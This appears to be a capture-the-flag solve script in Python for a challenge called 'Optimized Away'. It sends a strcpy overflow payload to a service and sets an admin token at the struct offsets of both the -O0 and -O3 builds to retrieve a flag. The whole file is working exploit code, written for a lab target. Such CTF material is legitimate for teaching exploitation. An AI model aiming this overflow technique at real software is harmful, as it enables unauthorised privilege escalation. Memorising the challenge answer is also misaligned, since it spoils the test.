#!/usr/bin/env python3
"""Optimized Away — scripted solve (stdlib only).

usage: solve.py HOST PORT

The ledgerd mirror runs both builds in lockstep and opens the report only
when BOTH accept the audit. The same source produces two different frames:

    compat (-O0): keeps the AU-7 scratch buffer  -> admin sits at tag+120
    prod   (-O3): the scratch buffer is optimized away -> admin sits at tag+88

`tag <text>` strcpy()s the tag line over the session struct, and the AU-7
token 0x31415926 is printable and NUL-free ("&YA1" little-endian), so one
plain-text payload can carry the token at BOTH offsets at once:

    "A"*88 + "&YA1" + "A"*28 + "&YA1"

In compat the first token lands harmlessly inside the scratch buffer; in
prod the second one lands harmlessly inside session note[]. Each build
reads its own token off its own frame.
"""

import socket
import sys

TOK = b"&YA1"                      # 0x31415926, LE
PROD_OFF = 88                      # prod (-O3): tag -> session.admin
COMPAT_OFF = 120                   # compat (-O0): tag -> session.admin


def main():
    if len(sys.argv) != 3:
        print(__doc__)
        return 1
    host, port = sys.argv[1], int(sys.argv[2])

    s = socket.create_connection((host, port), timeout=15)
    f = s.makefile("rwb")

    def send(line):
        f.write(line + b"\n")
        f.flush()

    def recv():
        line = f.readline()
        if not line:
            raise SystemExit("connection closed")
        return line.decode(errors="replace").rstrip("\n")

    def wait_ready():
        for _ in range(8):
            line = recv()
            if line.startswith("ready"):
                return

    wait_ready()

    send(b"layout")
    print("[*] " + recv())

    send(b"audit")
    print("[*] baseline audit      : " + recv())

    send(b"tag " + b"A" * PROD_OFF + TOK)
    recv()
    send(b"audit")
    print("[*] prod-only payload   : " + recv())

    send(b"tag " + b"A" * COMPAT_OFF + TOK)
    recv()
    send(b"audit")
    print("[*] compat-only payload : " + recv())
    print("    (fixing compat broke prod — one offset per frame)")

    combined = b"A" * PROD_OFF + TOK + b"A" * (COMPAT_OFF - PROD_OFF - 4) + TOK
    send(b"tag " + combined)
    recv()
    send(b"audit")
    consensus = recv()
    print("[*] combined payload    : " + consensus)
    if "AUDIT_OK — compat: AUDIT_OK" not in consensus:
        print("[-] mirror still disagrees")
        return 1

    flag = recv()
    print("[+] " + flag)
    return 0 if "cyber_quest{" in flag else 1


if __name__ == "__main__":
    sys.exit(main())
